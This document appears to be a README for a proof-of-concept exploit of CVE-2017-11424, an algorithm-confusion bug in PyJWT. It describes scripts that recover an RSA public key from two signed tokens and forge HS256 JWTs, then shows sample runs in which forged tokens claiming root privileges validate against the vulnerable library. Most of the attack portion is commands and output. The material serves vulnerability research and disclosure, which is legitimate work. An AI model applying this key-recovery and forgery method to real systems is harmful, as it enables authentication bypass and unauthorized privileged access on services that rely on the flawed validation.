CVE-2017-11424 PoC Without the Public Key
=========================================

When a JWT validator doesn't explicity specifies the signature algorithm, the verification method is determined based on the `alg` information contained in the (user-supplied) JWT. Asymmetric signature verification is perfromed with a public key. When changing the asymmetric authentication algorithm to a symmetric one (such as HS256), the public key used for verification will be the one that supposed to have authenticated the message. 

PyJWT uses a file header blacklist to prevent accidentally using public keys for symmetric MAC verification, but the `-----BEGIN RSA PUBLIC KEY-----` marker was missing from this list, thus [CVE-2017-11424](https://github.com/jpadilla/pyjwt/pull/277) was born. Such key files [can be generated](https://blog.ndpar.com/2017/04/17/p1-p8/) from private keys with the following OpenSSL command:

```
openssl rsa -in private.pem -out public.pem -RSAPublicKey_out
```

In most practical JWT scenarios neither the private nor the public keys are known to an attacker, so exploitation in a black-box setting may seem unlikely. However, at least in case of RSA, public keys can be recovered from two message-signature pairs with the method described [here](https://crypto.stackexchange.com/questions/30289/is-it-possible-to-recover-an-rsa-modulus-from-its-signatures).

The code in this directory demonstrates recovery of public keys, and forging valid JWT tokens against a vulnerable version of pyJWT.

Contents
--------

Build a Python 3.8 virtualenv using the provided `requirements.txt`.

### confusing.py

Test code to reproduce JWT signature generation with `gmpy2`.

### test_CVE-2017-11424.py

Test script for the targeted vulnerability to check if a vulnerable version is available in the local environment.

### x_CVE-2017-11424.py

Proof-of-Concept exploit. It takes two RS2048 signed JWT's as cmdline arguments. It generates PEM files from the possible public key parameters (there can be multiple candidates). It automatically creates forged JWT tokens with HS256 signatures, using the PEM files as keys. 

### test_tampered_jwt.py

It checks whether a tampered JWT checks out with pyJWT when using the original public key. 

Example
-------

```
% python test_CVE-2017-11424.py 2> /dev/null
Testing CVE-2017-11424

b'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJqb2UiLCJleHAiOjE2MTI4MDE0NzQsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlfQ.M6CptDLriTVfZHcDrX99zfKJcjxT0Bgi7EPg22IBDE27o0cLJnZiKdVVgbNrrThmYm0lH5V6y3kliZR6joUcKrRBR7ILo70VA4ukEd-Q8-leGP_eIwUciW7EBRyEw0dvfdTxUTtHeUmw9lVUvPuNkEz8yJVXz6d3I278RvlR8_8k2o9nMvql9_n4EAxcM5KioCdgkJtIXFbSFx6KLdow_X4xD8LwHWlhtCoGoC5JkJ3xfJzpRkVnFOa9BpRsdrodkqZVwf6ORfUtopF1JvpRoQXgEX30euXoJBUgaTGJwbvp2pXdnWlV5lZgZUVeGD-X8wloh88CxdkPL-oGOczFVw'
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJqb2UiLCJleHAiOjE2MTI4MDE0NzQsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlfQ.NvhqE1q7w-f3LTW6vLHR-o0P5HJ-i33YtupycpizNtQ'

Using a vulnerable library, good.

% python x_CVE-2017-11424.py \
> eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJqb2UiLCJleHAiOjEzMDA4MTkzODAsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlfQ.IDcgYnWIJ0my4FurSqfiAAbYBz2BfImT-uSqKKnk-JfncL_Nreo8Phol1KNn9fK0ZmVfcvHL-pUvVUBzI5NrJNCFMiyZWxS7msB2VKl6-jAXr9NqtVjIDyUSr_gpk51xSzHiBPVAnQn8m1Dg3dR0YkP9b5uJ70qpZ37PWOCKYAIfAhinDA77RIP9q4ImwpnJuY3IDuilDKOq9bsb6zWB8USz0PAYReqWierdS4TYAbUFrhuGZ9mPgSLRSQVtibyNTSTQYtfghYkmV9gWyCJUVwMGCM5l1xlylHYiioasBJA1Wr_NAf_sr4G8OVrW1eO01MKhijpaE8pR6DvPYNrTMQ \
> eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJqb2UiLCJleHAiOjEzMDA4MTkzODEsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlfQ.AH-6ZBGA38IjQdBWbc9mPSPwdHGBcNUw1fT-FhhRA-DnX7A7Ecyaip0jt7gOkuvlXfSBXC91DU6FH7rRcnwgs474jgWCAQm6k5hOngOIce_pKQ_Pk1JU_jFKiKzm668htfG06p9caWa-NicxBp42HKB0w9RRBOddnfWk65d9JTI89clgoLxxz7kbuZIyWAh-Cp1h3ckX7XZmknTNqncq4Y2_PSlcTsJ5aoIL7pIgFQ89NkaHImALYI7IOS8nojgCJnJ74un4F6pzt5IQyvFPVXeODPf2UhMEIEyX3GEcK3ryrD_DciJCze3qjtcjR1mBd6zvAGOUtt6XHSY7UHJ3gg
[*] GCD:  0x2
[*] GCD:  0x143f02c15c5c79368cb9d1a5acac4c66c5724fb7c53c3e048eff82c4b9921426dc717b2692f8b6dd4c7baee23ccf8e853f2ad61f7151e1135b896d3127982667ea7dba03370ef084a5fd9229fc90aeed2b297d48501a6581eab7ec5289e26072d78dd37bedd7ba57b46cf1dd9418cd1ee03671b7ff671906859c5fcda4ff5bc94b490e92f3ba9739f35bd898eb60b0a58581ebdf14b82ea0725f289d1dac982218d6c8ec13548f075d738d935aeaa6260a0c71706ccb8dedef505472ce0543ec83705a7d7e4724432923f6d0d0e58ae2dea15f06b1b35173a2f8680e51eff0fb13431b1f956cf5b08b2185d9eeb26726c780e069adec0df3c43c0a8ad95cbd342
[+] Found n with multiplier 1  :
 0x143f02c15c5c79368cb9d1a5acac4c66c5724fb7c53c3e048eff82c4b9921426dc717b2692f8b6dd4c7baee23ccf8e853f2ad61f7151e1135b896d3127982667ea7dba03370ef084a5fd9229fc90aeed2b297d48501a6581eab7ec5289e26072d78dd37bedd7ba57b46cf1dd9418cd1ee03671b7ff671906859c5fcda4ff5bc94b490e92f3ba9739f35bd898eb60b0a58581ebdf14b82ea0725f289d1dac982218d6c8ec13548f075d738d935aeaa6260a0c71706ccb8dedef505472ce0543ec83705a7d7e4724432923f6d0d0e58ae2dea15f06b1b35173a2f8680e51eff0fb13431b1f956cf5b08b2185d9eeb26726c780e069adec0df3c43c0a8ad95cbd342
[+] Written to 143f02c15c5c7936_65537_x509.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAiam9lIiwgImV4cCI6IDE2MTI4MDE1MzgsICJodHRwOi8vZXhhbXBsZS5jb20vaXNfcm9vdCI6IHRydWV9.Ca_0egGixlW-_d-c6bJTPUq1em-A17fYa1r1pceid7M'
[+] Written to 143f02c15c5c7936_65537_pkcs1.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAiam9lIiwgImV4cCI6IDE2MTI4MDE1MzgsICJodHRwOi8vZXhhbXBsZS5jb20vaXNfcm9vdCI6IHRydWV9.CiNH7yuFA-NgBXRmi88mR6iPl0mnxHsRqbcsndAwXQI'
[+] Found n with multiplier 2  :
 0xa1f8160ae2e3c9b465ce8d2d656263362b927dbe29e1f02477fc1625cc90a136e38bd93497c5b6ea63dd7711e67c7429f956b0fb8a8f089adc4b69893cc1333f53edd019b87784252fec914fe4857769594bea4280d32c0f55bf62944f130396bc6e9bdf6ebdd2bda3678eeca0c668f701b38dbffb38c8342ce2fe6d27fade4a5a4874979dd4b9cf9adec4c75b05852c2c0f5ef8a5c1750392f944e8ed64c110c6b647609aa4783aeb9c6c9ad755313050638b83665c6f6f7a82a396702a1f641b82d3ebf2392219491fb686872c5716f50af8358d9a8b9d17c340728f7f87d89a18d8fcab67ad84590c2ecf759339363c07034d6f606f9e21e05456cae5e9a1
[+] Written to a1f8160ae2e3c9b4_65537_x509.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAiam9lIiwgImV4cCI6IDE2MTI4MDE1MzgsICJodHRwOi8vZXhhbXBsZS5jb20vaXNfcm9vdCI6IHRydWV9.CJEMLpDA555gchGYqYdhuaJhvjBQ2gx3wOZayM9eDtA'
[+] Written to a1f8160ae2e3c9b4_65537_pkcs1.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAiam9lIiwgImV4cCI6IDE2MTI4MDE1MzgsICJodHRwOi8vZXhhbXBsZS5jb20vaXNfcm9vdCI6IHRydWV9.g9tuvnoxBzJlAWVQn0zWcOKU5oCMpTHeddDeiJkF3Ys'

% python test_tampered_jwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAiam9lIiwgImV4cCI6IDE2MTI4MDE1MzgsICJodHRwOi8vZXhhbXBsZS5jb20vaXNfcm9vdCI6IHRydWV9.g9tuvnoxBzJlAWVQn0zWcOKU5oCMpTHeddDeiJkF3Ys standard.pub.pem
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAiam9lIiwgImV4cCI6IDE2MTI4MDE1MzgsICJodHRwOi8vZXhhbXBsZS5jb20vaXNfcm9vdCI6IHRydWV9.g9tuvnoxBzJlAWVQn0zWcOKU5oCMpTHeddDeiJkF3Ys
[+] VULNERABLE - JWT successfully validated with key: standard.pub.pem
```

Limitations
-----------

* If the target explicitly sets the signature algorithm the attack won't work

Public key guessing:
* The server needs to have its keys in the same format we generate. Implementing other output formats is an exercise for the reader (I suffered enough from ASN.1, and so should you)
* If key files contain additional, unpredictable data, the key can not be reconstructed.
